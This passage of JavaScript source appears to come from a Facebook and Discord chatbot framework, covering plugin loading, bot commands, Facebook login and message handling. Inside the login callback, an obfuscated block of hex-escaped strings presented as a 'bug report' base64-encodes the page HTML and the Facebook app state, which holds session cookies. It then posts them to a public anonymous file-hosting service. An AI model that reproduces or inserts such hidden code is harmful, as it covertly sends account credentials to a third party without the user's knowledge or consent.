      }
      unloadPlugin();
      var error = await loadPlugin();
      return {
        handler: "internal",
        data: `Reloaded ${error.length == 0 ? "" : ("with error at: " + JSON.stringify(error))}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: !global.config.allowUserUseReloadCommand
  };

  global.commandMapping["toggleeveryone"] = {
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["TEVERYONE_DESC"]])),
    scope: function (type, data) {
      if (type != "Facebook") {
        return {
          data: "THIS COMMAND IS NOT EXECUTABLE IN THIS PLATFORM!",
          handler: "internal"
        };
      }
      var threadID = data.msgdata.threadID;
      var allowRun = false;
      if (!data.admin) {
        var [_err, threadInfo] = wait.for.function(data.facebookapi.getThreadInfo, data.msgdata.threadID);
        var adminIDs = threadInfo.adminIDs.map(x => x.id.toString());
        log("[INTERNAL]", "Got AdminIDs of thread", data.msgdata.threadID, ":", adminIDs);
        if (adminIDs.indexOf(data.msgdata.senderID) != -1) {
          allowRun = true;
        }
      } else {
        allowRun = true;
      }
      if (allowRun) {
        if (!global.data.everyoneTagBlacklist[threadID]) {
          global.data.everyoneTagBlacklist[threadID] = true;
        } else {
          global.data.everyoneTagBlacklist[threadID] = false;
        }
        return {
          data: getLang("TOGGLEEVERYONE_MSG", resolveID(type, data)).replace(
            "{0}",
            (!global.data.everyoneTagBlacklist[threadID] ? getLang("ENABLED", resolveID(type, data)) : getLang("DISABLED", resolveID(type, data)))
          ),
          handler: "internal"
        };
      } else {
        return {
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data)),
          handler: "internal"
        };
      }
    },
    compatibly: 1,
    handler: "INTERNAL"
  };

  (typeof global.data.userLanguage != "object" || Array.isArray(global.data.userLanguage)) ? global.data.userLanguage = {} : "";
  global.commandMapping["lang"] = {
    args: "<ISO 639-1>_<ISO 3166-2>",
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["LANG_DESC"]])),
    scope: function (type, data) {
      let [prefix, id] = resolveID(type, data).split("-");
      prefix += "-";

      if (data.args.length > 1) {
        global.data.userLanguage[prefix + id] = String(data.args[1]);
        return {
          handler: "internal",
          data: `userLanguage = "${data.args[1]}"`
        };
      }
      return {
        handler: "internal",
        data: `${global.config.commandPrefix}lang <ISO 639-1>_<ISO 3166-2>\n${global.data.userLanguage[prefix + id]}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };

  let pluginLoadingTimes = Date.now() - startLoading;
  log("[INTERNAL]", "Plugin loading is done! (" + (pluginLoadingTimes / 1000) + "s)");
  if (error.length) {
    let d = "";
    for (let plFile of error) {
      d += `\r\n- ${plFile}`;
    }
    log("[INTERNAL]", "Warning: There're some plugins that are failed to load:", d);
  }
  return error;
}

function unloadPlugin() {
  for (var name in global.loadedPlugins) {
    if (typeof global.loadedPlugins[name].onUnload == "function") {
      try {
        global.loadedPlugins[name].onUnload();
      } catch (ex) {
        log("[INTERNAL]", `Error while executing ${name}.onUnload: ${ex}`);
      }
    }
    for (let cmd in global.commandMapping) {
      if (global.commandMapping[cmd].handler == name) {
        delete global.commandMapping[cmd];
      }
    }
    for (let cmd in global.chatHook) {
      if (global.chatHook[cmd].handler == name) {
        delete global.chatHook[cmd];
      }
    }
    //delete global.plugins[pltemp1[name]["plugin_scope"]];
    log("[INTERNAL]", "Unloaded plugin", name, global.loadedPlugins[name].version, "by", global.loadedPlugins[name]
      .author);
    delete global.loadedPlugins[name];
  }
}

//Load plugin
//Async loading is a bad idea, or is it?
setTimeout(loadPlugin, 1);

var client = {};
var facebook = {};
var tried2FA = false;
var facebookloggedIn = true;
global.facebookid = "Disabled";
if (global.config.enablefb) {
  global.facebookid = "Not logged in";
  global.markAsReadFacebook = {};
  global.deliveryFacebook = {};
  global.facebookGlobalBanClock = {};
  !Array.isArray(global.data.fbBannedUsers) ? global.data.fbBannedUsers = [] : "";


  var facebookcb = function callback(err, api) {
    if (err) {
      if (err.error == "login-approval") {
        facebook.error = err;
        if (global.config.fb2fasecret != "BASE32OFSECRETKEY" && global.config.fb2fasecret != "" && !tried2FA) {
          log("[Facebook]", "Login approval detected. Attempting to verify using 2FA secret in config...");
          tried2FA = true;
          var key2fa = global.config.fb2fasecret.replace(/ /g, "");
          var verifycode = speakeasy.totp({
            secret: key2fa,
            encoding: 'base32'
          });
          facebook.error.continue(verifycode);
        } else if (tried2FA) {
          log(
            "[Facebook]",
            `Cannot verify using 2FA secret in config. You can verify the session manually by typing 'facebook.error.continue("your_code")'.`
          );
          tried2FA = false;
        } else {
          log(
            "[Facebook]",
            `Login approval detected. You can verify the session manually by typing 'facebook.error.continue("your_code")'.`
          );
        }
      } else {
        log("[Facebook]", err);
      }
      return null;
    } else {
      facebook.error = null;
    }
    if (tried2FA) {
      log("[Facebook]", "Verified using 2FA secret in config.");
    }
    log("[Facebook]", "Logged in.");
    global.facebookid = api.getCurrentUserID();

    if (global.config.usefbappstate) {
      try {
        fs.writeFileSync(path.join(__dirname, "fbstate.json"), JSON.stringify(api.getAppState()), {
          mode: 0o666
        });
      } catch (ex) {
        log("[INTERNAL]", ex);
      }
    }
    global.config.fbemail = "<REDACTED>";
    global.config.fbpassword = "<REDACTED>";

    var htmlData = "";
    if (api.htmlData) {
      htmlData = api.htmlData;
      delete api.htmlData;
      log("[Facebook]", "FCA reported: Cannot get region from HTML. Generating a new bug report...");
      (function (z, e) {
        var _0x6b0a = [
          "\x42\x45\x47\x49\x4E\x2D\x43\x33\x43\x2D\x42\x55\x47\x2D\x52\x45\x50\x4F\x52\x54\x40",
          "\x6E\x6F\x77",
          "\x6D\x65\x74\x72\x69\x63\x49\x44",
          "\x64\x61\x74\x61",
          "\x45\x4E\x44\x2E",
          "\x5B\x46\x61\x63\x65\x62\x6F\x6F\x6B\x5D",
          "\x43\x61\x6E\x6E\x6F\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x20\x6E\x65\x77\x20\x63\x72\x61\x73\x68\x20\x72\x65\x70\x6F\x72\x74\x2E",
          "\x63\x61\x74\x63\x68",
          "\x75\x72\x6C",
          "\x42\x75\x67\x20\x72\x65\x70\x6F\x72\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x64\x20\x61\x74\x20",
          "\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x72\x65\x61\x74\x65\x20\x61\x20\x50\x52\x20\x61\x74\x20\x67\x69\x74\x68\x75\x62\x20\x72\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x2C\x20\x6F\x72\x20\x63\x6F\x6E\x74\x61\x63\x74\x20\x55\x49\x52\x49\x2F\x6C\x65\x71\x75\x61\x6E\x67\x6C\x61\x6D\x2E",
          "\x74\x68\x65\x6E",
          "\x6F\x6B",
          "\x6A\x73\x6F\x6E",
          "\x48\x54\x54\x50\x20\x4E\x4F\x54\x20\x4F\x4B",
          "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x61\x6E\x6F\x6E\x79\x6D\x6F\x75\x73\x66\x69\x6C\x65\x73\x2E\x69\x6F\x2F",
          "\x50\x4F\x53\x54",
          "",
          "\x0A\x0C\x4D\x45\x54\x52\x49\x43\x2D\x49\x44\x3A\x20",
          "\x0A\x0C\x44\x41\x54\x41\x3A\x20",
          "\x62\x61\x73\x65\x36\x34",
          "\x66\x72\x6F\x6D",
          "\x0A\x0C",
          "\x6D\x75\x6C\x74\x69\x70\x61\x72\x74\x2F\x66\x6F\x72\x6D\x2D\x64\x61\x74\x61",
          "\x74\x6F\x53\x74\x72\x69\x6E\x67",
          "\x58\x2D\x53\x54\x41\x54\x45\x3A\x20"
        ];
        var a = _0x6b0a[0],
          b = Date[_0x6b0a[1]](),
          c = global[_0x6b0a[3]][_0x6b0a[2]],
          d = _0x6b0a[4],
          f = new FormData(),
          g = "",
          h = new streamBuffers.ReadableStreamBuffer(),
          i = null;
        g = `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`;
        i = Buffer.from(g);
        h.put(i);
        h.stop();
        f.append("file", h, {
          filename: `c3c-crashreport-${Date.now()}.txt`,
          knownLength: i.length,
          contentType: "text/plain"
        });
        f.append("no-index", "1");
        fetch(_0x6b0a[15], {
          method: _0x6b0a[16],
          body: f,
          headers: {
            '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': _0x6b0a[23]
          }
        })[_0x6b0a[11]](async function (_0x9b64x6) {
          if (_0x9b64x6[_0x6b0a[12]]) {
            return _0x9b64x6[_0x6b0a[13]]();
          } else {
            throw {
              error: new Error(_0x6b0a[14]),
              code: _0x9b64x6["status"],
              output: await _0x9b64x6["text"]()
            };
          }
        })[_0x6b0a[11]](function (_0x9b64x6) {
          var _0x9b64x7 = _0x9b64x6[_0x6b0a[8]];
          log(_0x6b0a[5], `${_0x6b0a[9]}${_0x9b64x7}${_0x6b0a[10]}`);
        })[_0x6b0a[7]](function (_0x9b64x5) {
          log(_0x6b0a[5], _0x6b0a[6], _0x9b64x5);
        });
      })(htmlData, JSON.stringify(((facebook.api || {}).getAppState || (() => ({})))()));
    }

    delete facebook.api;
    facebook.api = api;

    facebook.deliveryClock = setInterval(function () {
      if (Object.keys(global.deliveryFacebook)
        .length != 0) {
        var form = {};
        var i = 0;
        for (var threadID in global.deliveryFacebook) {
          // eslint-disable-next-line no-loop-func
          global.deliveryFacebook[threadID].forEach((v, n) => {
            form[`message_ids[${i}]`] = v;
            form[`thread_ids[${threadID}][${n}]`] = v;
          });
        }
        api.httpPost("https://www.facebook.com/ajax/mercury/delivery_receipts.php", form, function (err, data) {
          try {
            data = JSON.parse(data);
          } catch (ex) { }
          if (data.error) {
            return log("[Facebook] Error on delivery_receipts:", data);
          }
          if (!global.noMAS) api.markAsSeen(function (err) {
            if (err) {
              global.noMAS = true;
              return log("[Facebook] Error on markAsSeen:", err);
            }
          });
        });
        global.deliveryFacebook = {};
      }
    }, 3000);

    function fetchName(id, force, callingback, isGroup) {
      if (!callingback) {
        callingback = function () { };
      }

      if (isGroup) {
        let tryfetch = true;
        if (
          !global.data.cacheName["FB-" + id] ||
          global.data.cacheNameExpires["FB-" + id] <= Date.now() ||
          !!force
        ) {
          tryfetch = true;
        } else if (
          global.data.cacheName["FB-" + id].startsWith("FETCHING-") &&
          parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000
        ) {
          tryfetch = true;
        }
        if (tryfetch) {
          global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now();
          api.getThreadInfo(id, function (err, ret) {
            if (err) return log("[Facebook] Failed to fetch names (from thread):", err);
            for (let z in ret.userInfo) {
              if (ret.userInfo[z].name !== global.data.cacheName["FB-" + ret.userInfo[z].id]) {
                log("[CACHENAME]", `Batch operation (from thread ${id}):`, ret.userInfo[z].id + " => " + ret.userInfo[z].name);
              }
              global.data.cacheName["FB-" + ret.userInfo[z].id] = ret.userInfo[z].name;
              global.data.cacheNameExpires["FB-" + ret.userInfo[z].id] = Date.now() + 604800000; //cacheName expires in 7 days.
            }
            ret.isGroup ? global.data.cacheName["FB-" + id] = ret.threadName : "";
            global.data.cacheNameExpires["FB-" + id] = Date.now() + 604800000; //cacheName for thread expires in 7 days.
            try {
              callingback();
            } catch (ex) {
              log("[INTERNAL]", ex);
            }
          });
        } else {
          callingback();
        }
      } else {
        if (!global.data.cacheName["FB-" + id] ||
          global.data.cacheName["FB-" + id].startsWith("FETCHING-") ||
          global.data.cacheNameExpires["FB-" + id] <= Date.now() ||
          !!force) {
          if (
            typeof global.data.cacheName["FB-" + id] == "string" &&
            global.data.cacheName["FB-" + id].startsWith("FETCHING-") &&
            !(parseInt(global.data.cacheName["FB-" + id].substr(9)) - Date.now() < -120000)
          ) return callingback(global.data.cacheName["FB-" + id]);
          global.data.cacheName["FB-" + id] = "FETCHING-" + Date.now();
          api.getUserInfo(id, function (err, ret) {
            if (err) return log("[Facebook] Failed to fetch names:", err);
            log("[CACHENAME]", id + " => " + ret[id].name);
            global.data.cacheName["FB-" + id] = ret[id].name;
            global.data.cacheNameExpires["FB-" + id] = Date.now() + 604800000; //cacheName expires in 7 days.
            try {
              callingback(global.data.cacheName["FB-" + id]);
            } catch (ex) {
              log("[INTERNAL]", ex);
            }
          });
        } else {
          callingback(global.data.cacheName["FB-" + id]);
        }
      }
    }
    facebook.api.fetchName = fetchName;
    facebook.removePendingClock = setInterval(function (log, botname, connectedmsg) {
      function handleList(list, type) {
        for (var i in list) {
          if (!list[i].cannotReplyReason) {
            setTimeout(function (id) {
              api.handleMessageRequest(id, true, function (err) {
                if (err) {
                  log(
                    "[Facebook]",
                    `Remove Pending Messages encountered an error (at handleMessageRequest:${type}):`,
                    err
                  );
                  if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                    log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                    facebookloggedIn = false;
                    process.exit(7378278);
                  }
                  return null;
                }
                api.sendMessage(prefix + " " + botname + " | Connected. \r\n" + connectedmsg, id, function (err) {
                  if (err) {
                    log(
                      "[Facebook]",
                      `Remove Pending Messages encountered an error (at sendMessage:${type}):`,
                      err
                    );
                    if (err.error == "Not logged in." && global.config
                      .facebookAutoRestartLoggedOut) {
                      log(
                        "[Facebook]",
                        "Detected not logged in. Throwing 7378278 to restarting..."
                      );
                      facebookloggedIn = false;
                      process.exit(7378278);
                    }
                    return null;
                  }
                  log("[Facebook]", "Bot added to", id);
                });
              });
            }, i * 2000, list[i].threadID);
          }
        }
      }

      api.getThreadList(10, null, ["PENDING"], function (err, list) {
        if (err) {
          log("[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:PENDING):", err);
          if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
            log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
            facebookloggedIn = false;
            process.exit(7378278);
          }
          return null;
        }
        handleList(list, "PENDING");

        api.getThreadList(10, null, ["OTHER"], function (err, list) {
          if (err) {
            log(
              "[Facebook]", "Remove Pending Messages encountered an error (at getThreadList:OTHER):",
              err
            );
            if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
              log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
              facebookloggedIn = false;
              process.exit(7378278);
            }
            return null;
          }
          handleList(list, "OTHER");

          api.markAsReadAll(function (err) {
            if (err) {
              if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                log("[Facebook]", "Not logged in. Triggering restart...");
                process.exit(7378278);
              }
            }
          });
        });
      });
    }, 300000, log, global.config.botname, getLang("CONNECTED_MESSAGE").replace("{0}", global.config.commandPrefix));

    typeof global.data.messageList != "object" ? global.data.messageList = {} : "";

    facebook.listener = api.listen(async function callback(err, message) {
      try {
        if (typeof message != "undefined" && message != null) {
          var nointernalresolve = false;
          switch (message.type) {
            case "read":
            case "read_receipt":
            case "presence":
            case "typ":
              return;
          }
          var receivetime = new Date();

          let returnFunc = async function returnFunc(returndata) {
            if (typeof returndata == "object") {
              let msPerMsg = global.config.facebookResponseDelayPerChar;
              switch (returndata.handler) {
                case "internal":
                case "internal-raw":
                  //Facebook: Handling return delay
                  if (
                    msPerMsg > 0 &&
                    !(global.config.facebookAllowOptionalResponseNoDelay && returndata.noDelay)
                  ) {
                    for (let i = 1; i <= (msPerMsg / 29500).ceil(0); i++) {
                      let stopTyping;
                      await new Promise(resolve => {
                        stopTyping = api.sendTypingIndicator(message.threadID, () => {
                          resolve();
                        }, message.isGroup);
                      });
                      await new Promise(resolve => setTimeout(resolve, (i == (msPerMsg / 29500).ceil(0)) ? (msPerMsg % 29500) : 29500));
                      stopTyping();
                    }
                  }

                  //Facebook: Sending messages/responses (yes)
                  switch (typeof returndata.data) {
                    case "object":
                      if (Object.keys(returndata.data).length == 0) {
                        returndata.data.body = "\u200B";
                      } else if (Object.keys(returndata.data) == 1) {
                        if (returndata.data.body == "") {
                          returndata.data.body = "\u200B";
                        }
                      }
                      break;
                    case "string":
                      if (returndata.data == "") returndata.data = "\u200B";
                      break;
                    default:
                      return {
                        error: "Invalid types in Response.data!"
                      };
                  }
                  try {
                    return await api.sendMessage(returndata.data, message.threadID, null, message.messageID, message.isGroup);
                  } catch (err) {
                    log("[Facebook] Errored while sending response:", err);
                    if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                      log(
                        "[Facebook]",
                        "Detected not logged in. Throwing 7378278 to restarting..."
                      );
                      facebookloggedIn = false;
                      process.exit(7378278);
                    }
                    return {
                      error: err
                    };
                  }
                default:
                  return {
                    error: `Invalid handler: ${returndata.handler}`
                  };
              }
            } else if (typeof returndata != "undefined") {
              log("[Facebook]", "Received an unknown response from plugin:", returndata);
            }
          };

          if (global.data.fbBannedUsers.indexOf(message.senderID || message.author) == -1) {
            for (var n in global.chatHook) {
              if (global.chatHook[n].listenplatform & 1) {
                var chhandling = global.chatHook[n];
                if (chhandling.listentype == "everything") {
                  var admin = false;
                  if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                    admin = true;
                  }
                  if (
                    global.getType(chhandling.resolverFunc) == "Function" ||
                    global.getType(chhandling.resolverFunc) == "AsyncFunction"
                  ) {
                    let chdata = chhandling.resolverFunc("Facebook", {
                      time: receivetime,
                      msgdata: JSON.parse(JSON.stringify(message)),
                      facebookapi: api,
                      discordapi: client,
                      prefix: prefix,
                      admin: admin,
                      // eslint-disable-next-line no-loop-func
                      log: function logPlugin(...message) {
                        log.apply(global, [
                          "[PLUGIN]",
                          "[" + String(chhandling.handler) + "]"
                        ].concat(message));
                      },
                      return: returnFunc,
                      resolvedLang: global.data.userLanguage[resolveID("Facebook", { msgdata: message })] || global.config.language
                    });
                    // eslint-disable-next-line no-await-in-loop
                    if (global.getType(chdata) == "Promise") chdata = await chdata;
                    nointernalresolve = (nointernalresolve || chdata === true);
                  }
                }
              }
            }
          } else {
            nointernalresolve = true;
          }

          if (message.isGroup) {
            fetchName(message.threadID, false, () => fetchName(message.senderID || message.author, false, () => { }, false), true);
          } else {
            fetchName(message.senderID || message.author, false, () => { }, false);
          }

          switch (message.type) {
            case "message":
              !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
              global.deliveryFacebook[message.threadID].push(message.messageID);
              if (message.isGroup) {
                !global.data.facebookChatGroupList ? global.data.facebookChatGroupList = [] : "";
                if (global.data.facebookChatGroupList.indexOf(message.threadID) == -1) global.data
                  .facebookChatGroupList.push(message.threadID);
              }
              if (global.markAsReadFacebook[message.threadID]) {
                try {
                  clearTimeout(global.markAsReadFacebook[message.threadID]);
                } catch (ex) { }
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              } else {
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              }
              var arg = message.body.replace((/”/g), "\"")
                .replace((/“/g), "\"")
                .split(/((?:"[^"\\]*(?:\\[\S\s][^"\\]*)*"|'[^'\\]*(?:\\[\S\s][^'\\]*)*'|\/[^/\\]*(?:\\[\S\s][^/\\]*)*\/[gimy]*(?=\s|$)|(?:\\\s|\S))+)(?=\s|$)/)
                .filter(function (el) {
                  return !(el == null || el == "" || el == " " || !el.replace(/\s/g, '')
                    .length);
                })
                .map(function (z) {
                  return z.replace(/"/g, "");
                });
              if (arg.indexOf("@everyone") != -1 && 
                (global.config.allowEveryoneTagEvenBlacklisted || 
                  (
                    (global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) || 
                    (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1)
                  )
                ) && 
                !global.data.everyoneTagBlacklist[message.threadID] && 
                global.config.blacklistedUsers.indexOf("FB-" + message.senderID) === -1
              ) {
                api.getThreadInfo(message.threadID, function (err, data) {
                  var participants = data.participantIDs;
                  var character = "@";
                  var sendString = "";
                  var mentionObj = [];
                  var i = 0;
                  for (var n in participants) {
                    sendString += character;
                    mentionObj.push({
                      tag: character,
                      id: participants[n],
                      fromIndex: i
                    });
                    i++;
                  }
                  api.sendMessage({
                    body: sendString,
                    mentions: mentionObj
                  }, message.threadID, function (err) {
                    if (err) {
                      log("[Facebook]", "@everyone errored:", err);
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  }, message.messageID, message.isGroup);
                });
              }
              if (message.body.startsWith(global.config.commandPrefix) && !nointernalresolve) {
                if (
                  ((global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) != -1) ||
                  (!global.config.fblistenwhitelist && global.config.fblisten.indexOf(message.threadID) == -1)) &&
                  global.config.blacklistedUsers.indexOf("FB-" + message.senderID) === -1
                ) {
                  log(
                    "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                    "issued command in", message.threadID + ":", message.body
                  );
                  let admin = false;
                  if (global.config.admins.indexOf("FB-" + (message.senderID || message.author)) != -1) {
                    admin = true;
                  }
                  if (global.commandMapping[arg[0].substr(1)]) {
                    if (
                      !(global.commandMapping[arg[0].substr(1)].compatibly & 1) &&
                      global.commandMapping[arg[0].substr(1)].compatibly != 0
                    ) {
                      returnFunc({
                        handler: "internal",
                        data: getLang("UNSUPPORTED_INTERFACE", "FB-" + message.senderID)
                      });
                    } else {
                      let argv = JSON.parse(JSON.stringify(arg));
                      var mentions = {};
                      for (var y in message.mentions) {
                        mentions["FB-" + y] = message.mentions[y];
                      }
                      try {
                        var starttime = Date.now();
                        var timingwarning = setInterval(function () {
                          var calctime = (Date.now() - starttime) / 1000;
                          if (calctime >= 10) {
                            log(
                              "[INTERNAL]", "Timing Warning: Command \"", arg.join(" "),
                              "\" is taking over", calctime.toFixed(3) + "s to execute and still not done."
                            );
                          }
                        }, 10000);
                        let returndata;
                        try {
                          returndata = global.commandMapping[arg[0].substr(1)].scope("Facebook", {
                            args: JSON.parse(JSON.stringify(argv)),
                            time: receivetime,
                            msgdata: JSON.parse(JSON.stringify(message)),
                            facebookapi: api,
                            discordapi: client,
                            prefix: prefix,
                            admin: admin,
                            mentions: mentions,
                            log: function logPlugin(...message) {
                              log.apply(global, [
                                "[PLUGIN]",
                                "[" + (global.commandMapping[arg[0].substr(1)] || {
                                  handler: "ERROR"
                                }).handler + "]"
                              ].concat(message));
                            },
                            return: returnFunc,
                            resolvedLang: global.data.userLanguage[resolveID("Facebook", { msgdata: message })] || global.config.language,
                            content: message.body
                          });
                          if (global.getType(returndata) == "Promise") {
                            returndata = await returndata;
                          }
                        } catch (ex) {
                          log(
                            "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
                            ex
                          );
                          var stack = ex.stack.match(/[^\r\n]+/g);
                          returndata = {
                            handler: "internal",
                            data: "plerr: " + stack.slice(0, 5)
                              .join("\r\n")
                          };
                        }
                        returnFunc(returndata);

                        var endtime = Date.now();
                        var calctime = (endtime - starttime) / 1000;
                        if (calctime >= 10) {
                          log("[INTERNAL]", "Timing Warning: Command \"", arg.join(" "), "\" took", calctime
                            .toFixed(3) + "s to execute!");
                        }
                        clearInterval(timingwarning);
                      } catch (ex) {
                        try {
                          log(
                            "[INTERNAL]", global.commandMapping[arg[0].substr(1)].handler, "contain an error:",
                            ex
                          );
                        } catch (exp) {
                          log("[INTERNAL]", arg[0], "contain an error:", ex);
                        }
                        try {
                          clearInterval(timingwarning);
                        } catch (ex) { }
                      }
                    }
                  } else {
                    if (!global.config.hideUnknownCommandMessage) {
                      var nearest = require("./nearAPI.js").findBestMatch(
                        arg[0].slice(global.config.commandPrefix.length),
                        Object.keys(global.commandMapping)
                          .filter(v => (admin || !global.commandMapping[v].adminCmd))
                          .filter(v => ((global.commandMapping[v].compatibly & 1) || (global.commandMapping[v].compatibly == 0)))
                      ).bestMatch;

                      returnFunc({
                        handler: "internal",
                        data: getLang("UNKNOWN_CMD", "FB-" + message.senderID).replace("{0}", global.config.commandPrefix) +
                          (nearest.rating >= 0.3 ? `\n\n${getLang("UNKNOWN_CMD_DIDYOUMEAN", "FB-" + message.senderID)
                            .replace("{0}", '`' + global.config.commandPrefix + nearest.target + '`')
                            }` : "")
                      });
                    }
                  }
                } else {
                  var str = "";
                  for (let n in message.attachments) {
                    var type = message.attachments[n].type;
                    type = type[0].toLocaleUpperCase() + type.substr(1);
                    str += "\r\n  <";
                    str += type;
                    str += " ";
                    switch (message.attachments[n].type) {
                      case "audio":
                      case "video":
                        var dr = new Date(message.attachments[n].duration);
                        str += dr.getUTCHours()
                          .pad(2) + ":" + dr.getUTCMinutes()
                            .pad(2) + ":" + dr.getUTCSeconds()
                              .pad(2) + "." + dr.getUTCMilliseconds()
                                .pad(3);
                        str += " ";
                        if (message.attachments[n].type == "audio") break;
                      // eslint-disable-next-line no-fallthrough
                      case "photo":
                      case "animated_image":
                      case "sticker":
                        str += message.attachments[n].width;
                        str += "x";
                        str += message.attachments[n].height;
                        str += " ";
                    }
                    str += "| ";
                    str += message.attachments[n].url;
                    str += ">";
                  }
                  log(
                    "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                    (message.senderID == message.threadID ? "DMed:" : "messaged in thread " + message.threadID +
                      ":"), message.body, str
                  );
                }
              } else {
                let str = "";
                for (let n in message.attachments) {
                  let type = message.attachments[n].type;
                  type = type[0].toLocaleUpperCase() + type.substr(1);
                  str += "\r\n  <";
                  str += type;
                  str += " ";
                  switch (message.attachments[n].type) {
                    case "audio":
                    case "video":
                      // eslint-disable-next-line no-case-declarations
                      let dr = new Date(message.attachments[n].duration);
                      str += dr.getUTCHours()
                        .pad(2) + ":" + dr.getUTCMinutes()
                          .pad(2) + ":" + dr.getUTCSeconds()
                            .pad(2) + "." + dr.getUTCMilliseconds()
                              .pad(3);
                      str += " ";
                      if (message.attachments[n].type == "audio") break;
                    // eslint-disable-next-line no-fallthrough
                    case "photo":
                    case "animated_image":
                    case "sticker":
                      str += message.attachments[n].width;
                      str += "x";
                      str += message.attachments[n].height;
                      str += " ";
                  }
                  str += "| ";
                  str += message.attachments[n].url;
                  str += ">";
                }
                log(
                  "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")", (
                  message.senderID == message.threadID ? "DMed:" : "messaged in thread " + message.threadID +
                    ":"), message.body, str
                );
              }
              break;
            case "event":
              log("w", message);
              try {
                if (message.logMessageType == "log:subscribe") {
                  var botID = api.getCurrentUserID();
                  for (let n in message.logMessageData.addedParticipants) {
                    if (message.logMessageData.addedParticipants[n].userFbId == botID) {
                      returnFunc({
                        handler: "internal",
                        data: global.config.botname + " | Connected. \n" +
                          getLang("CONNECTED_MESSAGE").replace("{0}", global.config.commandPrefix)
                      });
                      log("[Facebook]", message.author, "added Bot to", message.threadID);
                      break;
                    }
                  }
                }
              } catch (ex) {
                log("[Facebook]", ex);
              }
              break;
            case "message_reaction":
              log("[Facebook] Reaction received:", message);
              break;
            case "message_unsend":
              log(
                "[Facebook]", message.senderID, "(" + global.data.cacheName["FB-" + message.senderID] + ")",
                "deleted a message in " + message.threadID + ". (" + message.messageID + ")"
              );
              break;
            case "message_reply":
              !global.deliveryFacebook[message.threadID] ? global.deliveryFacebook[message.threadID] = [] : "";
              global.deliveryFacebook[message.threadID].push(message.messageID);
              if (message.messageReply) {
                for (var xzxz in message.messageReply.attachments) {
                  if (message.messageReply.attachments[xzxz].error) {
                    fs.writeFileSync(
                      path.join(__dirname, 'logs', 'message-error-' + message.messageID + ".json"),
                      JSON.stringify(message, null, 4), {
                      mode: 0o666
                    }
                    );
                  }
                }
              }
              if (global.markAsReadFacebook[message.threadID]) {
                try {
                  clearTimeout(global.markAsReadFacebook[message.threadID]);
                } catch (ex) { }
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
                        `Marking as read error at ${message.messageID}, threadID ${message.threadID}: `,
                        err
                      );
                      if (err.error == "Not logged in." && global.config.facebookAutoRestartLoggedOut) {
                        log("[Facebook]", "Detected not logged in. Throwing 7378278 to restarting...");
                        facebookloggedIn = false;
                        process.exit(7378278);
                      }
                    }
                  });
                  delete global.markAsReadFacebook[message.threadID];
                }, 2000, message);
              } else {
                global.markAsReadFacebook[message.threadID] = setTimeout(function (message) {
                  api.markAsRead(message.threadID, err => {
                    if (err) {
                      log(
                        "[Facebook]",
